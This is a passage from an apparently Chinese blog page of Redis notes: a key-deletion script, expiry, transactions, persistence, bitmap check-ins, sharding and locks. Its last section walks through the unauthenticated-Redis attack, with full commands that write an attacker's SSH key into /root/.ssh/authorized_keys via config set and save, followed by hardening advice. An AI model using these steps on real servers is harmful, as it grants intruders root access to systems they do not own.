<span class="string">'/app/local/redis-3.2.11/src/redis-cli -h 0.0.0.0 -p %s -a %s del %s'</span>%(port, passwd, key)</span><br><span class="line">				(status,result) = execCmd(cmd)</span><br><span class="line">				<span class="keyword">if</span> status == <span class="number">0</span>:</span><br><span class="line">					print <span class="string">'del key %s success'</span>%(key)</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					print <span class="string">'del key %s failed...'</span>%(key)</span><br><span class="line">					print result</span><br><span class="line">				line = f.readline()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		print result</span><br><span class="line">	print <span class="string">'redis %s key delete finished...'</span>%(date)</span><br><span class="line">调用这个脚本，只需要输入命令：python /home/hadoop/scripts/rediskey.py <span class="string">'2018-08-01'</span> <span class="number">6379</span> <span class="string">'123456'</span></span><br><span class="line">四个参数：</span><br><span class="line"> </span><br><span class="line">脚本名：/home/hadoop/scripts/rediskey.py</span><br><span class="line">要清理的日期：<span class="number">2018</span><span class="number">-08</span><span class="number">-01</span></span><br><span class="line">端口：<span class="number">6379</span></span><br><span class="line">host：<span class="number">123456</span></span><br><span class="line">基本思想就是模糊匹配redis的key，保存到一个文件，然后读取文件每一行，删除key即可。http:<span class="comment">//www.ikeguang.com/2018/08/28/delete-redis-key/</span></span><br></pre></td></tr></table></figure>
<h3 id="redis总结"><a href="#redis总结" class="headerlink" title="redis总结"></a>redis总结</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">redis中的键的生存时间</span><br><span class="line">expire  设置生存时间（单位/秒）</span><br><span class="line">expire key seconds(秒)</span><br><span class="line"></span><br><span class="line">ttl 查看键的剩余生存时间</span><br><span class="line">ttl key</span><br><span class="line"></span><br><span class="line">persist 取消生存时间</span><br><span class="line">persist key</span><br><span class="line"></span><br><span class="line">expireat指定时刻过期</span><br><span class="line">expireat key unix时间戳</span><br><span class="line">expireat key <span class="number">1551858600</span></span><br><span class="line">一组redis命令要么都执行，要么都不执行。</span><br><span class="line">原理：先将属于一个事务的命令发送给redis进行缓存，最后再让redis依次执行这些命令。</span><br><span class="line"></span><br><span class="line">应用场景：</span><br><span class="line">一组命令必须同时都执行，或者都不执行。</span><br><span class="line">我们想要保证一组命令在执行的过程之中不被其它命令插入。</span><br><span class="line">multi    <span class="comment">//事务开始</span></span><br><span class="line">.....</span><br><span class="line">exec     <span class="comment">//事务结束，开始执行事务中的命令</span></span><br><span class="line">discard     <span class="comment">//放弃事务</span></span><br><span class="line">正因为redis不支持回滚功能，才使得redis在事务上可以保持简洁和快速。</span><br><span class="line">redis持久化指把数据持久化到磁盘，便于故障恢复，redis支持两种方式的持久化，可以单独使用或者结合起来使用。</span><br><span class="line"></span><br><span class="line">第一种：RDB方式（redis默认的持久化方式）</span><br><span class="line">第二种：AOF方式</span><br><span class="line">edis持久化之RDB</span><br><span class="line"></span><br><span class="line">rdb方式的持久化是通过快照完成的，当符合一定条件时redis会自动将内存中的所有数据执行快照操作并存储到硬盘上。默认存储在dump.rdb文件中。(文件名在配置文件中dbfilename)</span><br><span class="line"></span><br><span class="line">redis进行快照的时机（在配置文件redis.conf中）</span><br><span class="line"></span><br><span class="line"> http:<span class="comment">//www.ikeguang.com/2018/12/12/redis-usage/</span></span><br><span class="line">save <span class="number">900</span> <span class="number">1</span>  <span class="comment">//表示900秒内至少一个键被更改则进行快照。</span></span><br><span class="line">save <span class="number">300</span> <span class="number">10</span>  <span class="comment">//表示300秒内10条被更改则快照</span></span><br><span class="line">save <span class="number">60</span> <span class="number">10000</span>  <span class="comment">//60秒内10000条</span></span><br><span class="line">Redis自动实现快照的过程</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、redis使用fork函数复制一份当前进程的副本(子进程)</span><br><span class="line"><span class="number">2</span>、父进程继续接收并处理客户端发来的命令，而子进程开始将内存中的数据写入硬盘中的临时文件</span><br><span class="line"><span class="number">3</span>、当子进程写入完所有数据后会用该临时文件替换旧的RDB文件，至此，一次快照操作完成。</span><br><span class="line">注意：快照时，要保证内存还有一半空间。</span><br><span class="line">rdb的优缺点</span><br><span class="line"></span><br><span class="line">优点：由于存储的有数据快照文件，恢复数据很方便。</span><br><span class="line">缺点：会丢失最后一次快照以后更改的所有数据。</span><br><span class="line"></span><br><span class="line">redis持久化之AOF</span><br><span class="line"></span><br><span class="line">把写操作指令，持续的写到一个类似日志文件里。</span><br><span class="line"></span><br><span class="line">由于写操作指令保存在日志文件里，异常恢复时把文件里面所有指令执行一遍即可。如果你执行了flushall命令，清空了redis，而你采用的aof持久化方式，那么，就可以找到这个文件，将最后一行flushall删掉，执行恢复命令，将命令全部执行一遍，这样数据就恢复了。</span><br><span class="line">AOF 的默认策略为每秒钟 fsync 一次，在这种配置下，Redis 仍然可以保持良好的性能，并且就算发生故障停机，也最多只会丢失一秒钟的数据（ fsync 会在后台线程执行，所以主线程可以继续努力地处理命令请求）。</span><br><span class="line"></span><br><span class="line">对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。</span><br><span class="line">Redis 的 bit 可以用于实现比 set 内存高度压缩的计数，它通过一个 bit <span class="number">1</span> 或 <span class="number">0</span> 来存储某个元素是否存在信息。例如网站唯一访客计数，可以把 user_id 作为 bit 的偏移量 offset，设置为 <span class="number">1</span> 表示有访问，使用 <span class="number">1</span> MB的空间就可以存放 <span class="number">800</span> 多万用户的一天访问计数情况。</span><br><span class="line">SETBIT key offset value  # 设置位信息 setbit users 123 1</span><br><span class="line">GETBIT key offset        # 获取位信息</span><br><span class="line">BITCOUNT key [start end] # 计数</span><br><span class="line">BITOP operation destkey key [key ...]  # 位图合并</span><br><span class="line">基于 bit 的方法比起 set 空间消耗小得多，但是它要求元素能否简单映射为位偏移，适用面窄了不少，另外它消耗的空间取决于最大偏移量，和计数值无关，如果最大偏移量很大，消耗内存也相当可观。</span><br><span class="line"></span><br><span class="line">数据在【从服务器】里【读】，在【主服务器】里【写】。</span><br><span class="line">数据库分为两类，一类是主数据库（master），另一类是从数据库[<span class="number">1</span>] （slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。</span><br><span class="line">SETBIT video:<span class="number">1201</span> <span class="number">200</span> <span class="number">1</span></span><br><span class="line"># 上面的命令就是设置ID为200的用户，已经看过了ID为1201的视频。 </span><br><span class="line">GETBIT video:<span class="number">1201</span> <span class="number">200</span></span><br><span class="line"># 上面的命令就是查询ID为200的用户是否观看了ID为1201的视频</span><br><span class="line">https:<span class="comment">//www.zhihu.com/question/27672245</span></span><br><span class="line">&gt;set zhihu <span class="string">"www.zhihu.com"</span></span><br><span class="line">&gt;bitcount zhihu</span><br><span class="line"><span class="number">61</span></span><br><span class="line">$str = <span class="string">"www.zhihu.com"</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>;$i&lt;strlen($str);$i++) &#123;</span><br><span class="line">	$bin .= sprintf(<span class="string">"%08b"</span>, ord($str[$i]));</span><br><span class="line">&#125;</span><br><span class="line">echo ($bin); #01110111011101110111011100101110011110100110100001101001011010000111010100101110011000110110111101101101</span><br><span class="line">echo array_sum(str_split($bin, 1)); #61</span><br><span class="line"></span><br><span class="line"> &gt;set andy a</span><br><span class="line"> &gt;setbit andy <span class="number">6</span> <span class="number">1</span></span><br><span class="line"> &gt;setbit andy <span class="number">7</span> <span class="number">0</span></span><br><span class="line"> &gt;get andy </span><br><span class="line"> b</span><br><span class="line"> BITCOUNT 就是统计字符串的二级制码中，有多少个<span class="string">'1'</span>。 所以在这里，</span><br><span class="line"> </span><br><span class="line"> BITCOUNT andy 得到的结果就是 <span class="number">3</span> 啦。</span><br><span class="line"> </span><br><span class="line"><span class="string">'a'</span> 的ASCII码是  <span class="number">97</span>。转换为二进制是：<span class="number">01100001</span>。offset的学名叫做“偏移” 。二进制中的每一位就是offset值啦，比如在这里  offset <span class="number">0</span> 等于 ‘<span class="number">0</span>’ ，offset <span class="number">1</span>等于<span class="string">'1'</span> ,offset2等于<span class="string">'1'</span>,offset <span class="number">7</span> 等于<span class="string">'1'</span> ，没错，offset是从左往右计数的，也就是从高位往低位。我们通过SETBIT 命令将 andy中的 <span class="string">'a'</span> 变成 <span class="string">'b'</span> 应该怎么变呢？也就是将 <span class="number">01100001</span> 变成 <span class="number">01100010</span> （b的ASCII码是<span class="number">98</span>），这个很简单啦，也就是将<span class="string">'a'</span>中的offset <span class="number">6</span>从<span class="number">0</span>变成<span class="number">1</span>，将offset <span class="number">7</span> 从<span class="number">1</span>变成<span class="number">0</span> 。</span><br><span class="line"></span><br><span class="line"> bitcount key startOffset endOffset</span><br><span class="line"> </span><br><span class="line"> key：键值</span><br><span class="line"> </span><br><span class="line"> startOffset：起始偏移量（注意：这个偏移量是以字节为单位的）</span><br><span class="line"> </span><br><span class="line"> endOffset：结束偏移量（注意：这个偏移量同样是以字节为单位的）</span><br></pre></td></tr></table></figure>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> $dayKey = <span class="string">'login:'</span>.\date(<span class="string">'Ymd'</span>,\time());</span><br><span class="line">$redis-&gt;setbit($dayKey, $<span class="keyword">this</span>-&gt;user-&gt;id, <span class="number">1</span>);</span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'threeAnd'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"连续三天都签到的用户数量："</span> . $redis-&gt;bitCount(<span class="string">'threeAnd'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'OR'</span>, <span class="string">'threeOr'</span>, <span class="string">'login:20190311'</span>, <span class="string">'login:20190312'</span>, <span class="string">'login:20190313'</span>);</span><br><span class="line">echo <span class="string">"三天中签到用户数量（有一天签也算签了）："</span> . $redis-&gt;bitCount(<span class="string">'threeOr'</span>);</span><br><span class="line"></span><br><span class="line">$redis-&gt;bitop(<span class="string">'AND'</span>, <span class="string">'monthActivities'</span><span class="string">', $redis-&gt;keys('</span>login:<span class="number">201903</span>*<span class="string">'));</span></span><br><span class="line"><span class="string">echo "连续一个月签到用户数量：" . $redis-&gt;bitCount('</span>monthActivities<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "当前用户指定天数是否签到：" . $redis-&gt;getbit('</span>login:<span class="number">20190311</span><span class="string">', $this-&gt;user-&gt;id);</span></span><br><span class="line"><span class="string">https://learnku.com/articles/25181</span></span><br><span class="line"><span class="string">$redis-&gt;scan(0, '</span>match<span class="string">', '</span>login:<span class="number">201903</span>*<span class="string">', '</span>count<span class="string">', 1000))</span></span><br><span class="line"><span class="string">COUNT 参数的默认值为 10 ，如果不是 0 ，你再使用 scan 3 match login:201903* 继续遍历。</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-分布式存储"><a href="#Redis-分布式存储" class="headerlink" title="Redis 分布式存储"></a>Redis 分布式存储</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisCluster</span> </span>&#123;</span><br><span class="line">    public $servers = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addServer</span>(<span class="params">$host, $port</span>) </span>&#123;</span><br><span class="line">        $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">        $redis-&gt;_connected = <span class="literal">false</span>;</span><br><span class="line">        $redis-&gt;_host = $host;</span><br><span class="line">        $redis-&gt;_port = $port;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;servers[] = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!method_exists(<span class="string">"Redis"</span>, $method)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Execption(<span class="string">"not method"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $redis = $<span class="keyword">this</span>-&gt;servers[abs(crc32($args[<span class="number">0</span>])) % count($<span class="keyword">this</span>-&gt;servers)];</span><br><span class="line">        <span class="keyword">if</span> (!$redis-&gt;_connected) &#123;</span><br><span class="line">            $redis-&gt;connect($redis-&gt;_host, $redis-&gt;_port);</span><br><span class="line">            $redis-&gt;_connected = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// return $redis-&gt;$method(...$args); // PHP 5.6</span></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([$redis, $method], $args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc = <span class="keyword">new</span> RedisCluster();</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8000</span>);</span><br><span class="line">$rc-&gt;addServer(<span class="string">"127.0.0.1"</span>, <span class="number">8001</span>);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/32153</span></span><br><span class="line">$rc-&gt;set(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"b"</span>, <span class="number">2</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"c"</span>, <span class="number">3</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"d"</span>, <span class="number">4</span>);</span><br><span class="line">$rc-&gt;set(<span class="string">"e"</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure>
<h3 id="获取大-key"><a href="#获取大-key" class="headerlink" title="获取大 key"></a>获取大 key</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span> –-bigkeys 也可以追加一个休眠参数，防止在查询过程 ops 暴增，使用此命令：redis-cli -h <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> -p <span class="number">7001</span>–-bigkeys -i <span class="number">0.1</span></span><br><span class="line">https:<span class="comment">//github.com/leonchen83/redis-rdb-cli</span></span><br></pre></td></tr></table></figure>
<h3 id="redis锁"><a href="#redis锁" class="headerlink" title="redis锁"></a>redis锁</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果获取到锁，则执行 $callback 回调</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = $<span class="keyword">this</span>-&gt;acquire();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result &amp;&amp; is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果获取到锁，则执行 $callback 回调</span></span><br><span class="line"><span class="comment">// 如果没有获取到锁，会等待250毫秒，继续去获取锁</span></span><br><span class="line"><span class="comment">// 如果在 $seconds 秒之内还没有获取到锁，会抛出 LockTimeoutException 异常</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params">$seconds, $callback = null</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $starting = $<span class="keyword">this</span>-&gt;currentTime();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (! $<span class="keyword">this</span>-&gt;acquire()) &#123;</span><br><span class="line">        usleep(<span class="number">250</span> * <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($<span class="keyword">this</span>-&gt;currentTime() - $seconds &gt;= $starting) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> LockTimeoutException;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> tap($callback(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;release();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisLock</span> <span class="keyword">extends</span> <span class="title">Lock</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The Redis factory implementation.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @var \Illuminate\Redis\Connections\Connection</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    protected $redis;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a new lock instance.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param  \Illuminate\Redis\Connections\Connection  $redis</span></span><br><span class="line"><span class="comment">     * @param  string  $name</span></span><br><span class="line"><span class="comment">     * @param  int  $seconds</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$redis, $name, $seconds</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        parent::__construct($name, $seconds);</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis = $redis;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Attempt to acquire the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">acquire</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $result = $<span class="keyword">this</span>-&gt;redis-&gt;setnx($<span class="keyword">this</span>-&gt;name, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result === <span class="number">1</span> &amp;&amp; $<span class="keyword">this</span>-&gt;seconds &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;redis-&gt;expire($<span class="keyword">this</span>-&gt;name, $<span class="keyword">this</span>-&gt;seconds);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $result === <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Release the lock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @return void</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">release</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;redis-&gt;del($<span class="keyword">this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33111</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-未授权访问配合"><a href="#Redis-未授权访问配合" class="headerlink" title="Redis 未授权访问配合"></a>Redis 未授权访问配合</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">部分 Redis 绑定在 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。</span><br><span class="line">利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</span><br><span class="line"></span><br><span class="line">Redis 暴露在公网（即绑定在<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。</span><br><span class="line">ssh-keygen –t rsa</span><br><span class="line">将公钥写入 foo.txt 文件</span><br><span class="line">$ (echo -e <span class="string">"\n\n"</span>; cat id_rsa.pub; echo -e <span class="string">"\n\n"</span>) &gt; foo.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ cat foo.txt | redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span> -x set crackit</span><br><span class="line"> </span><br><span class="line">$ redis-cli -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dir /root/.ssh/</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"> </span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>) <span class="string">"/root/.ssh"</span></span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; config set dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line"> </span><br><span class="line">$ <span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>:<span class="number">6379</span>&gt; save</span><br><span class="line"> </span><br><span class="line">OK</span><br><span class="line">这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：</span><br><span class="line"> </span><br><span class="line">$ ssh –i  id_rsa root@<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span></span><br><span class="line">即可远程利用自己的私钥登录该服务器。</span><br><span class="line">当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</span><br><span class="line">可以使用Pocsuite（http:<span class="comment">//github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//www.waitalone.cn/redis-unauthorized-of-expolit.html </span></span><br><span class="line">配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口<span class="number">6379</span></span><br><span class="line">配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中</span><br><span class="line">配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度</span><br><span 